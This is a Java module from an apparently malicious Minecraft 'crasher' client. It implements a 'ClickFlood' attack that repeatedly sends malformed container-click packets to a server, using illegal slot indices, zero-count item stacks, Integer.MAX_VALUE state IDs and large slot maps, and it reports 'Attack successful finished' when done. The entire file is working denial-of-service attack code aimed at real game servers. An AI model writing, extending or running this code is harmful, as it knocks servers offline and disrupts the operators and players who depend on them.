package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;
import me.dannycrasher.client.protocol.packets.PacketCodec;
import me.dannycrasher.client.protocol.packets.play.PacketContainerClick;
import net.minecraft.client.Minecraft;

import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class ClickFloodCrash extends Module {
	private ScheduledExecutorService executorService;

	public ClickFloodCrash() {
		super("ClickFlood", "Illegal slot-map / empty-stack container click flood", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 5000, "500");
		addArgument("mapSize", ArgumentType.INT, 1, 2048, "256");
		addArgument("illegalSlots", ArgumentType.BOOLEAN);
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "50");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		if (!Protocol.FULL_ITEM_PROTOCOLS.contains(protocol)) {
			context.sendMessage("<red>ClickFlood requires full-item protocols 766-769. Current: <aqua>" + protocol);
			return;
		}

		int packets = context.getInt("packets");
		int mapSize = context.getInt("mapSize");
		boolean illegalSlots = context.getBoolean("illegalSlots");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		ItemStack carried = new ItemStack(ItemType.STONE.getId(protocol), 64, null);
		ItemStack emptyish = new ItemStack(ItemType.STONE.getId(protocol), 0, null);
		Int2ObjectMap<ItemStack> map = new Int2ObjectOpenHashMap<>();
		for (int i = 0; i < mapSize; i++) {
			int slot = illegalSlots ? (i % 2 == 0 ? -1 - i : 30000 + i) : i;
			map.put(slot, i % 3 == 0 ? emptyish : carried);
		}

		if (executorService != null && !executorService.isShutdown()) {
			executorService.shutdownNow();
			context.sendMessage("Previous attack <red>stopped<white>!");
		}

		setEnabled(true);
		context.sendMessage("Start crashing with method: <aqua>" + getName() + "<white>!");

		AtomicInteger check = new AtomicInteger(0);
		executorService = Executors.newSingleThreadScheduledExecutor();
		executorService.scheduleAtFixedRate(() -> {
			if (!isEnabled() || !Protocol.isSendingEnabled() || check.get() == loopAmount
					|| (Minecraft.getInstance().getConnection() == null || !Minecraft.getInstance().getConnection().getConnection().isConnected())) {
				executorService.shutdown();
				setEnabled(false);
				if (Minecraft.getInstance().getConnection() != null) {
					context.sendMessage("Attack <green>successful <white>finished!");
				}
			} else {
				PacketCodec.sendPacket(new PacketContainerClick(
						protocol,
						illegalSlots ? -1 : 0,
						Integer.MAX_VALUE,
						illegalSlots ? Short.MIN_VALUE : 10,
						PacketContainerClick.ContainerActionType.CLICK_ITEM,
						PacketContainerClick.ContainerAction.LEFT_CLICK,
						carried,
						map
				), packets);
			}
			check.getAndIncrement();
		}, 0, threadSleep, TimeUnit.MILLISECONDS);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		ClickCrashRunner.shutdown(executorService);
	}
}
